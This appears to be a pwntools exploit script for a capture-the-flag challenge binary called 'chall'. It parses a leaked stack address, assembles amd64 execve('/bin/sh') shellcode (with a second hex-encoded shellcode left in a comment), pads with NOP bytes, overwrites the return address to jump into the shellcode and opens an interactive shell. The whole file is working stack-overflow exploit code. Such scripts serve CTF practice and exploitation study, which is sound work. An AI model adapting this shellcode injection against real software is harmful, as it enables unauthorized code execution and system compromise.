#!/usr/bin/python2.7

from pwn import *

p = process("./chall")
p.recvuntil("[")
leak = int(p.recvuntil("]").strip("]"), 16)
print(hex(leak))
p.recv()
pause()
context(arch="amd64")
shellcode = asm("""
mov rax, 0x3b
xor rdx, rdx;
xor rdi, rdi;
xor rsi, rsi;
movabs  rdi, 0x0068732F6E69622F
push    rdi
mov rdi, rsp
syscall
""")

# shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
payload = "\x90"*24 + p64(leak + 32) + shellcode
p.sendline(payload)
p.interactive()